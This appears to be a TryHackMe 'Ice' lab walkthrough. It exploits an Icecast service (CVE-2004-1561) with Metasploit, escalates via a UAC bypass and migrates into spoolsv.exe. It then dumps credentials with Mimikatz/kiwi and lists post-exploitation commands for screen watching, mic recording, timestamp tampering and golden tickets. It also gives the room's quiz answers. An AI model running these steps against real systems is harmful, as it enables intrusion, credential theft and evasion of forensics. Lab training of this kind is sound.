# Ice

Room: [Ice](https://tryhackme.com/room/ice)

Prerequisites: 
1. [Nmap](https://tryhackme.com/room/furthernmap)
2. [Metasploit: Introduction](https://tryhackme.com/room/metasploitintro)

<img width="935" height="206" alt="image" src="https://github.com/user-attachments/assets/3d944a7e-dee2-43cd-bc1d-48fb376c5b83" />

## Connect

Connect to the TryHackMe network! Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.

You can check how to connect through the [OpenVPN](https://tryhackme.com/room/openvpn) room.

Write the command: `sudo openvpn <filename>`

## Recon

### Answer the questions below

1. Deploy the machine! This may take up to three minutes to start.

Start the Lab Machine.

2. Launch a scan against our lab machine, I recommend using a SYN scan set to scan all ports on the machine.

Command to scan all the ports with SYN Scan: `nmap -sS -p- -T4 TARGET_IP`

Performs a TCP SYN (half-open) scan without completing the TCP three-way handshake. It's faster than a full TCP connect scan.

<img width="345" height="218" alt="image" src="https://github.com/user-attachments/assets/60c9716d-7ae4-4038-bb07-6464790e9e16" />

3. Once the scan completes, we'll see a number of interesting ports open on this machine. As you might have guessed, the firewall has been disabled (with the service completely shutdown), leaving very little to protect this machine. One of the more interesting ports that is open is Microsoft Remote Desktop (MSRDP). What port is this open on?

3389

We can see that the firewall must be disabled as we can see ports like RDP (3389), SMB (445) and RPC (135), like on normal Windows Firewall Defender, these are normally blocked or restricted to be accessible by the public.

4. What service did nmap identify as running on port 8000? (First word of this service)

Icecast, by command: `nmap -sC -sV -p8000 TARGET_IP`

<img width="479" height="124" alt="image" src="https://github.com/user-attachments/assets/7fce9c31-89fe-4706-8d7b-65ad2b20515e" />

5. What does Nmap identify as the hostname of the machine? (All caps for the answer)

DARK-PC, by command: `nmap -sC -sV -p- TARGET_IP`

<img width="563" height="326" alt="image" src="https://github.com/user-attachments/assets/b896370b-5807-4bc3-b826-de101e29c172" />

## Gain Access

You can refer to the [Icecast Exploit -Rapid7](https://www.rapid7.com/db/modules/exploit/windows/http/icecast_header/) to know about the vulnerability.

### Answer the questions below

1. Now that we've identified some interesting services running on our lab machine, let's do a little bit of research into one of the weirder services identified: Icecast. Icecast, or well at least this version running on our target, is heavily flawed and has a high level vulnerability with a score of 7.5 (7.4 depending on where you view it). What is the Impact Score for this vulnerability? Use [CVE Details: CVE-2004-1561](https://www.cvedetails.com) for this question and the next.

6.4

<img width="781" height="97" alt="image" src="https://github.com/user-attachments/assets/18ce7b7b-42eb-4f9f-9c2a-cc42c7274ad6" />

2. What is the CVE number for this vulnerability? This will be in the format: CVE-0000-0000

CVE-2004-1561

3. Now that we've found our vulnerability, let's find our exploit. For this section of the room, we'll use the Metasploit module associated with this exploit. Let's go ahead and start Metasploit using the command `msfconsole`

<img width="425" height="347" alt="image" src="https://github.com/user-attachments/assets/6393a480-eccc-4eb3-9877-98ddfa2dcda2" />

4. After Metasploit has started, let's search for our target exploit using the command `search icecast`. What is the full path (starting with exploit) for the exploitation module? 

`exploit/windows/http/icecast_header`

<img width="565" height="141" alt="image" src="https://github.com/user-attachments/assets/810a9e18-3c01-4af6-a4e3-fa3e21707f31" />

5. Let's go ahead and select this module for use. Type either the command `use icecast` or `use 0` to select our search result.

<img width="379" height="38" alt="image" src="https://github.com/user-attachments/assets/40a20a01-0129-46a5-86e6-0930d9902eca" />

6. Following selecting our module, we now have to check what options we have to set. Run the command `show options`. What is the only required setting which currently is blank?

RHOSTS

<img width="1431" height="607" alt="image" src="https://github.com/user-attachments/assets/b95954d6-1d89-48f0-92cc-3039ce4b5b34" />

7. First let's check that the LHOST option is set to our tun0 IP (which can be found on the access page). With that done, let's set that last option to our target IP. Now that we have everything ready to go, let's run our exploit using the command `exploit`.

First set up your LHOSTS with your tun0 IP which you can also see by command: `ifconfig` and then do command: `set LHOST TUN0_IP`

<img width="1423" height="279" alt="image" src="https://github.com/user-attachments/assets/0f997bba-8d5f-4910-9a35-b2d0edaddfb1" />

Now do the command: `exploit`, you get one session:

<img width="1078" height="136" alt="image" src="https://github.com/user-attachments/assets/b70768c3-e397-4ee2-bc6b-bd60a876dd1f" />

## Escalate

### Answer the questions below

1. Woohoo! We've gained a foothold into our victim machine! What's the name of the shell we have now?

Meterpreter

2. What user was running that Icecast process?

Dark, by command `getuid` where `Dark-PC` is the hostname and Dark is the user:

<img width="158" height="38" alt="image" src="https://github.com/user-attachments/assets/88bbd4da-7604-4d00-999c-e19f9bf9fe08" />

3. What build of Windows is the system?

7601 by command `sysinfo` under the OS:

<img width="317" height="108" alt="image" src="https://github.com/user-attachments/assets/d07fdd43-68d9-46d2-aeb1-5fa45bd597cf" />

4. Now that we know some of the finer details of the system we are working with, let's start escalating our privileges. First, what is the architecture of the process we're running?

x64 under the Architecture.

5. Now that we know the architecture of the process, let's perform some further recon. While this doesn't work the best on x64 machines, let's now run the following command `run post/multi/recon/local_exploit_suggester`. *This can appear to hang as it tests exploits and might take several minutes to complete*

<img width="850" height="315" alt="image" src="https://github.com/user-attachments/assets/adb267d7-8c04-4957-b2b9-739e72d13893" />

6. Running the local exploit suggester will return quite a few results for potential escalation exploits. What is the full path (starting with exploit/) for the first returned exploit?

`exploit/windows/local/bypassuac_eventvwr`, I got this answer from the hint.

<img width="845" height="215" alt="image" src="https://github.com/user-attachments/assets/ffedd5c2-cb2c-4ddd-8e64-8b5d4c30321b" />

7. Now that we have an exploit in mind for elevating our privileges, let's background our current session using the command `background` or `CTRL + z`. Take note of what session number we have, this will likely be 1 in this case. We can list all of our active sessions using the command `sessions` when outside of the meterpreter shell.

<img width="239" height="44" alt="image" src="https://github.com/user-attachments/assets/e16af58a-d916-4aeb-9362-71ff96f310b4" />

8. Go ahead and select our previously found local exploit for use using the command `use FULL_PATH_FOR_EXPLOIT`

Write command: `use exploit/windows/local/bypassuac_eventvwr`

<img width="447" height="59" alt="image" src="https://github.com/user-attachments/assets/c9d2cf3a-1c17-4092-9b80-4d22aeb5284a" />

9. Local exploits require a session to be selected (something we can verify with the command `show options`), set this now using the command `set session SESSION_NUMBER`

First check by `show options`, we need to set SESSION:

<img width="994" height="595" alt="image" src="https://github.com/user-attachments/assets/925e408e-a487-4e1e-8180-7999c60aa2dd" />

Then set the SESSION by: `set session 1`:

<img width="316" height="41" alt="image" src="https://github.com/user-attachments/assets/81cb8490-79dd-4985-8d0f-172abd2659a8" />

10. Now that we've set our session number, further options will be revealed in the options menu. We'll have to set one more as our listener IP isn't correct. What is the name of this option?

LHOST, as we need to set it with our tun0 IP Address.

11. Set this option now. You might have to check your IP on the TryHackMe network using the command `ip addr`

You can check your tun0 IP Address by `ifconfig`

Set LHOST by: `set LHOST TUN0_IP`:

<img width="742" height="81" alt="image" src="https://github.com/user-attachments/assets/46d3c15e-95ca-4531-8825-30a57e1f2096" />

12. After we've set this last option, we can now run our privilege escalation exploit. Run this now using the command `run`. Note, this might take a few attempts and you may need to relaunch the box and exploit the service in the case that this fails.

<img width="1099" height="294" alt="image" src="https://github.com/user-attachments/assets/cebae6af-7992-41df-aff6-aba777f64ddb" />

13. Following completion of the privilege escalation a new session will be opened. Interact with it now using the command `sessions SESSION_NUMBER`

It is already selected as it opened the Meterpreter session 2.

14. We can now verify that we have expanded permissions using the command `getprivs`. What permission listed allows us to take ownership of files?

SeTakeOwnershipPrivilege

<img width="176" height="330" alt="image" src="https://github.com/user-attachments/assets/549069c8-4820-461a-9906-18962e30ad8f" />

## Looting 

### Answer the questions below

1. Prior to further action, we need to move to a process that actually has the permissions that we need to interact with the lsass service, the service responsible for authentication within Windows. First, let's list the processes using the command `ps`. Note, we can see processes being run by NT AUTHORITY\SYSTEM as we have escalated permissions (even though our process doesn't).

<img width="671" height="326" alt="image" src="https://github.com/user-attachments/assets/9b541ca9-fa63-4c59-8908-946197ebc179" />

2. In order to interact with lsass we need to be 'living in' a process that is the same architecture as the lsass service (x64 in the case of this machine) and a process that has the same permissions as lsass. The printer spool service happens to meet our needs perfectly for this and it'll restart if we crash it! What's the name of the printer service?

The Print Spooler is a background service in Windows that manages print jobs sent to your printer.

Mentioned within this question is the term 'living in' a process. Often when we take over a running program we ultimately load another shared library into the program (a dll) which includes our malicious code. From this, we can spawn a new thread that hosts our shell. 

`spoolsv.exe`

<img width="658" height="110" alt="image" src="https://github.com/user-attachments/assets/5b325053-0563-4f7d-b875-7cd3b9a0d7e3" />

3. Migrate to this process now with the command `migrate -N PROCESS_NAME`

Command: `migrate -N spoolsv.exe`

<img width="199" height="49" alt="image" src="https://github.com/user-attachments/assets/5b1efdda-437c-47d7-9350-fe29693ed26c" />

4. Let's check what user we are now with the command `getuid`. What user is listed?

`NT AUTHORITY\SYSTEM`

<img width="191" height="34" alt="image" src="https://github.com/user-attachments/assets/a6b2a6be-36a2-448d-b2ac-445d6a0fa5e4" />

5. Now that we've made our way to full administrator permissions we'll set our sights on looting. Mimikatz is a rather infamous password dumping tool that is incredibly useful. Load it now using the command `load kiwi` (Kiwi is the updated version of Mimikatz)

<img width="388" height="119" alt="image" src="https://github.com/user-attachments/assets/6dab17e2-d17e-4056-ba16-6e5ddbde3248" />

6. Loading kiwi into our meterpreter session will expand our help menu, take a look at the newly added section of the help menu now via the command `help`.

<img width="439" height="299" alt="image" src="https://github.com/user-attachments/assets/18a1e6e7-1335-488e-81dd-be0209369b96" />

7. Which command allows up to retrieve all credentials?

`creds_all`

<img width="442" height="275" alt="image" src="https://github.com/user-attachments/assets/175a85eb-f20d-4d0e-acf8-f4fafb3b6426" />

8. Run this command now. What is Dark's password? Mimikatz allows us to steal this password out of memory even without the user 'Dark' logged in as there is a scheduled task that runs the Icecast as the user 'Dark'. It also helps that Windows Defender isn't running on the box ;) (Take a look again at the ps list, this box isn't in the best shape with both the firewall and defender disabled)

`Password01`, but I think correct actual password is `Password01!`

<img width="648" height="261" alt="image" src="https://github.com/user-attachments/assets/c1420253-2d4e-4487-a0be-2400d19f2ecc" />

## Post-Exploitation

1. Before we start our post-exploitation, let's revisit the help menu one last time in the meterpreter shell. We'll answer the following questions using that menu.

<img width="437" height="316" alt="image" src="https://github.com/user-attachments/assets/737ac7f5-3227-4113-a5da-76aaa27322c8" />

2. What command allows us to dump all of the password hashes stored on the system?

`hashdump`

<img width="359" height="80" alt="image" src="https://github.com/user-attachments/assets/ac716591-029a-4c75-b7ed-a12de1f36795" />

3. While more useful when interacting with a machine being used, what command allows us to watch the remote user's desktop in real time?

`screenshare`

<img width="455" height="206" alt="image" src="https://github.com/user-attachments/assets/28f9aa3d-92d3-4562-a9a9-5cbcaa0391fd" />

4. How about if we wanted to record from a microphone attached to the system?

`record_mic`

<img width="439" height="121" alt="image" src="https://github.com/user-attachments/assets/ccd05195-b57c-45a4-9228-33bebf134c69" />

5. To complicate forensics efforts we can modify timestamps of files on the system. What command allows us to do this?

`timestomp`

<img width="321" height="86" alt="image" src="https://github.com/user-attachments/assets/25345a72-2bf3-452c-8d01-b3e6428f4814" />

6. Mimikatz allows us to create what's called a `golden ticket`, allowing us to authenticate anywhere with ease. What command allows us to do this?

Golden ticket attacks are a function within Mimikatz which abuses a component to Kerberos (the authentication system in Windows domains), the ticket-granting ticket. In short, golden ticket attacks allow us to maintain persistence and authenticate as any user on the domain.

`golden_ticket_create`

<img width="438" height="274" alt="image" src="https://github.com/user-attachments/assets/71f8794c-8f5d-4146-8847-02ae8d5c4df5" />

7. One last thing to note. As we have the password for the user 'Dark' we can now authenticate to the machine and access it via remote desktop (MSRDP). As this is a workstation, we'd likely kick whatever user is signed onto it off if we connect to it, however, it's always interesting to remote into machines and view them as their users do. If this hasn't already been enabled, we can enable it via the following Metasploit module: `run post/windows/manage/enable_rdp`

The RDP is already enabled:

<img width="698" height="89" alt="image" src="https://github.com/user-attachments/assets/224e9c93-4ac7-4abf-a172-1fd13cd3fce7" />

I tried to connect to the Dark machine remotely but could not I dont know why.

<img width="1699" height="408" alt="image" src="https://github.com/user-attachments/assets/dea7eb18-16a9-47e6-870e-d85bc7a6f556" />

















































